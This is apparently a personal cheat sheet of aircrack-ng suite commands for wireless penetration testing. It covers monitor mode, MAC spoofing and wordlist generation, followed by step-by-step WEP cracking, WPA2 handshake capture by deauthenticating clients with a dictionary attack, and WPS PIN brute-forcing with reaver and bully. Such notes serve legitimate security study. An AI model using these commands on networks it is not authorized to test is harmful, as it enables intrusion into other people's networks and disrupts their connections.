clear

# install drivers
    git clone github.com/kimocoder/rtl8812au
    cd rtl8812au
    make && make install

    ip link set <interface name> down
    iwconfig <interface name> mode monitor
    ip link set <interface name> up

    airodump-ng -i <interface name>

apt-get install realtek-rtl88xxau-dkms


# to install the driver
apt-get install realtek-rtl88xxau-dkms

# kill all processes that use the network
airmon-ng check kill

-----------------------------------------------

# to enable monitor mode
iwconfig <interface name> mode monitor

# to enable managed mode
iwconfig <interface name> mode managed

-----------------------------------------------

# to enable and start monitoring mode on the wireless network card
# after that, the name of the wireless card will change to <name+mon> ex: wlan0mon
airmon-ng start <interface name>

# to disable and stop monitoring mode on the wireless network card
# after that, the name of the wireless card will change back to the original name. ex: wlan0
airmon-ng stop <interface name>

-----------------------------------------------

# get dump
airodump-ng wlan0mon


aireplay-ng --test wlan0mon

# to restart network service after wireless testing
service network-manager restart

# to start wifite with killing processes
wifite --kill

-----------------------------------------------------------------------

# change the mac address to manual address
macchanger -m xx:xx:xx... <interface name>

# change the mac address to fully random address
macchanger -r <interface name>

# change the mac address to fully random different kind of vendor address
macchanger -A <interface name>

# change the mac address to fully random same kind of vendor address
macchanger -a <interface name>

-----------------------------------------------------------------------

crunch <min> <max> <choices> -T <pattern|template> -o <output file name>

# ex:
crunch 4 4 0123456789 -T 9@@@ -o test.txt

-----------------------------------------------------------------------

# WEP:
# to check nearest wireless networks by their channel number and their bssid.
# finally, it writes dump details into the file
airodump-ng -c|--channel <channel number> -d|--bssid <bssid> -w|--write <file name> <interface name>

# 1st phase: to send fake authentication to clients of a wireless network
# target AP name is case sensitive
aireplay-ng -1|--fakeauth 0 -a <set AP mac> -h <client mac address> <interface name>

# 2nd phase: packet inection by aircrack-ng
# we are going to make additional traffic on the target network...
# here we have to see more packet data rate if we are using that client device
# after this phase, we have different files for using in other programs like kismet, aircrack, wireshark, etc.
aireplay-ng --arpreplay -b <access point mac> -h <client mac address> <interface name>

# 3rd phase: attack to target
# after this command, we should find the key !!!
aircrack-ng <file name from previous phase>

-----------------------------------------------------------------------

# WPA2:

# to check nearest wireless networks by their channel number and their bssid.
# finally, it writes dump details into the file
airodump-ng -c|--channel <channel number> -d|--bssid <bssid> -w|--write <file name> <interface name>

# send a deauthentication request for connected clients and capture next authentication packets of the client
aireplay-ng --deauth 0 -a <bssid> -c <client mac> <interface name>

# run a dictionary attack with a word list on the network using captured authentication file
aircrack-ng <captured file> -w <word list file>

----------------------------------------------------------------------

# WPS:

# to scan and list all WPS enabled network
# all LOCKED wps networks aren't vulnerable to this type of attack
wash -i <interface name>

# using reaver to attack to the WPS enabled network
# also, we can use the -N parameter to set No Nack
reaver -i <interface name> -b <bssid> -vv -k 1 -N

# we should use the bully to find the password from found WPS pin
bully -b <bssid> -p <WPS pin> <interface name>


---------------------------------------------------------------------


